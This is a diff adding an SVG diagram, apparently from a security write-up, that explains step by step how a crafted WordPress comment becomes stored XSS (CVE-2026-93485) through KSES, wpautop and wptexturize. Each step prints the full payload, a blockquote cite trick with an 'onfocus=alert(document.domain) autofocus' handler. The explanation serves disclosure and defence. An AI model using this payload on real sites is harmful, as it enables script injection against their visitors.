@@ -1,0 +1,457 @@
+  <svg xmlns="http://www.w3.org/2000/svg" width="1200" height="776" viewBox="0 0 1200 776" role="img" aria-labelledby="title desc">
+   <desc>
+    
+    
+    
+    A crafted WordPress comment becomes stored XSS in five steps: KSES stores a newline in a blockquote cite attribute, wpautop replaces it with an HTML comment and adds a paragraph wrapper, a regular expression inserts a paragraph tag inside the cite value, wptexturize changes the original closing quote, and the browser parses the remaining text as an event handler.
+   </desc>
+   <defs>
+    <marker viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto">
+     <path d="M0 0 8 4 0 8Z" fill="#d65b65">
+     </path>
+    </marker>
+   </defs>
+   <rect width="1200" height="776" fill="#0d1215">
+   </rect>
+   <path d="M0 732C265 682 414 760 665 726S1004 676 1200 718V776H0Z" fill="#68cfdf" opacity=".025">
+   </path>
+   <text x="54" y="58" fill="#f1f4f5" font-family="Arial,Helvetica,sans-serif" font-size="24" font-weight="700" letter-spacing="1.7">
+    
+    
+    
+    HOW A COMMENT BECOMES XSS
+   </text>
+   <text x="1146" y="58" text-anchor="end" fill="#68cfdf" font-family="Arial,Helvetica,sans-serif" font-size="13" font-weight="700" letter-spacing=".5">
+    
+    
+    
+    CVE-2026-93485    <tspan fill="#85949a" font-weight="400">
+     
+     
+     
+     (FIXED IN WORDPRESS 7.1.1)
+    </tspan>
+   </text>
+   <path d="M54 92H1146" stroke="#28363b">
+   </path>
+   <rect x="54" y="112" width="11" height="11" rx="2" fill="#68cfdf" opacity=".85">
+   </rect>
+   <text class="detail" x="74" y="122">
+    
+    
+    
+    attacker's input
+   </text>
+   <rect x="190" y="112" width="11" height="11" rx="2" fill="#e0b64d" opacity=".85">
+   </rect>
+   <text class="detail" x="210" y="122">
+    
+    
+    
+    newline
+   </text>
+   <rect x="286" y="112" width="11" height="11" rx="2" fill="#d65b65" opacity=".85">
+   </rect>
+   <text class="detail" x="306" y="122">
+    
+    
+    
+    transformed data
+   </text>
+   <g transform="translate(0 176)">
+    <circle cx="68" cy="-9" r="13" fill="#121a1e" stroke="#3d5057">
+    </circle>
+    <text class="step" x="68" y="-4" text-anchor="middle">
+     
+     
+     
+     1
+    </text>
+    <text class="stage" x="100" y="-4">
+     
+     
+     
+     POSTED AND STORED
+    </text>
+    <text class="fn" x="100" y="20">
+     
+     
+     
+     wp-comments-post.php → KSES → database
+    </text>
+    <text class="detail" x="100" y="42">
+     
+     
+     
+     KSES allows the blockquote HTML and newline in cite, then WordPress stores them
+    </text>
+    <rect x="100" y="56" width="1046" height="38" rx="8" fill="#121a1e" stroke="#3d5057">
+    </rect>
+    <text class="bytes" x="116" y="80">
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;blockquote cite="a
+     </tspan>
+     <tspan fill="#e0b64d">
+      
+      
+      
+      \n
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      b"&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;code&gt;x" onfocus=alert(document.domain) autofocus tabindex=0&lt;/code&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;/blockquote&gt;
+     </tspan>
+    </text>
+   </g>
+   <path class="flow" d="M68 184 V262" marker-end="url(#arrowRed)">
+   </path>
+   <path class="pulse" d="M68 188 V256">
+   </path>
+   <g transform="translate(0 292)">
+    <circle cx="68" cy="-9" r="13" fill="#121a1e" stroke="#3d5057">
+    </circle>
+    <text class="step" x="68" y="-4" text-anchor="middle">
+     
+     
+     
+     2
+    </text>
+    <text class="stage" x="100" y="-4">
+     
+     
+     
+     PLACEHOLDER AND PARAGRAPH
+    </text>
+    <text class="fn" x="100" y="20">
+     
+     
+     
+     wpautop()
+    </text>
+    <text class="detail" x="100" y="42">
+     
+     
+     
+     The newline becomes &lt;!-- wpnl --&gt;, and a paragraph wrapper is added
+    </text>
+    <rect x="100" y="56" width="1046" height="38" rx="8" fill="#121a1e" stroke="#3d5057">
+    </rect>
+    <text class="bytes" x="116" y="80">
+     <tspan fill="#d65b65">
+      
+      
+      
+      &lt;p&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;blockquote cite="a
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+       &lt;!-- wpnl --&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      b"&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;code&gt;x" onfocus=alert(document.domain) autofocus tabindex=0&lt;/code&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;/blockquote&gt;
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+      &lt;/p&gt;
+     </tspan>
+    </text>
+   </g>
+   <path class="flow" d="M68 300 V378" marker-end="url(#arrowRed)">
+   </path>
+   <path class="pulse" d="M68 304 V372">
+   </path>
+   <g transform="translate(0 408)">
+    <circle cx="68" cy="-9" r="13" fill="#121a1e" stroke="#3d5057">
+    </circle>
+    <text class="step" x="68" y="-4" text-anchor="middle">
+     
+     
+     
+     3
+    </text>
+    <text class="stage" x="100" y="-4">
+     
+     
+     
+     PARAGRAPH INSERTED
+    </text>
+    <text class="fn" x="100" y="20">
+     
+     
+     
+     preg_replace()
+    </text>
+    <text class="detail" x="100" y="42">
+     
+     
+     
+     The match stops at the placeholder's &gt; and inserts &lt;p&gt; inside cite
+    </text>
+    <rect x="100" y="56" width="1046" height="38" rx="8" fill="#121a1e" stroke="#3d5057">
+    </rect>
+    <text class="bytes" x="116" y="80">
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;blockquote cite="a
+     </tspan>
+     <tspan fill="#d65b65">
+     </tspan>
+     <tspan fill="#e0b64d">
+      
+      
+      
+      \n
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+      &lt;p&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+       b"&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;code&gt;x" onfocus=alert(document.domain) autofocus tabindex=0&lt;/code&gt;
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+      &lt;/p&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;/blockquote&gt;
+     </tspan>
+    </text>
+   </g>
+   <path class="flow" d="M68 416 V494" marker-end="url(#arrowRed)">
+   </path>
+   <path class="pulse" d="M68 420 V488">
+   </path>
+   <g transform="translate(0 524)">
+    <circle cx="68" cy="-9" r="13" fill="#121a1e" stroke="#3d5057">
+    </circle>
+    <text class="step" x="68" y="-4" text-anchor="middle">
+     
+     
+     
+     4
+    </text>
+    <text class="stage" x="100" y="-4">
+     
+     
+     
+     QUOTE SHIFTED
+    </text>
+    <text class="fn" x="100" y="20">
+     
+     
+     
+     wptexturize() in get_the_block_template_html()
+    </text>
+    <text class="detail" x="100" y="42">
+     
+     
+     
+     The closing quote in cite becomes a typographic quote. Meanwhile, the raw " inside &lt;code&gt; closes cite
+    </text>
+    <rect x="100" y="56" width="1046" height="38" rx="8" fill="#121a1e" stroke="#3d5057">
+    </rect>
+    <text class="bytes" x="116" y="80">
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;blockquote cite="a
+     </tspan>
+     <tspan fill="#d65b65">
+     </tspan>
+     <tspan fill="#e0b64d">
+      
+      
+      
+      \n
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+      &lt;p&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+       b
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+      &amp;#8221;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;code&gt;x" onfocus=alert(document.domain) autofocus tabindex=0&lt;/code&gt;
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+      &lt;/p&gt;
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      &lt;/blockquote&gt;
+     </tspan>
+    </text>
+   </g>
+   <path class="flow" d="M68 532 V610" marker-end="url(#arrowRed)">
+   </path>
+   <path class="pulse" d="M68 536 V604">
+   </path>
+   <g transform="translate(0 640)">
+    <circle cx="68" cy="-9" r="13" fill="#121a1e" stroke="#3d5057">
+    </circle>
+    <text class="step" x="68" y="-4" text-anchor="middle">
+     
+     
+     
+     5
+    </text>
+    <text class="stage" x="100" y="-4">
+     
+     
+     
+     XSS EXECUTED
+    </text>
+    <text class="fn" x="100" y="20">
+     
+     
+     
+     the browser's HTML parser
+    </text>
+    <text class="detail" x="100" y="42">
+     
+     
+     
+     The browser parses the HTML and processes the injected event handler
+    </text>
+    <rect x="100" y="56" width="1046" height="38" rx="8" fill="#121a1e" stroke="#3d5057">
+    </rect>
+    <text class="bytes" x="116" y="80">
+     <tspan fill="#c9d5d8">
+      
+      
+      
+      &lt;blockquote
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      cite="
+     </tspan>
+     <tspan fill="#c9d5d8">
+      
+      
+      
+      a \n&lt;p&gt; b
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+      ”
+     </tspan>
+     <tspan fill="#c9d5d8">
+      
+      
+      
+      &gt;&lt;code&gt;x
+     </tspan>
+     <tspan fill="#68cfdf">
+      
+      
+      
+      "
+     </tspan>
+     <tspan fill="#d65b65">
+      
+      
+      
+       onfocus="alert(document.domain)" autofocus="" tabindex="0&lt;/code"
+     </tspan>
+     <tspan fill="#c9d5d8">
+      
+      
+      
+      &gt;
+     </tspan>
+    </text>
+   </g>
+  </svg>
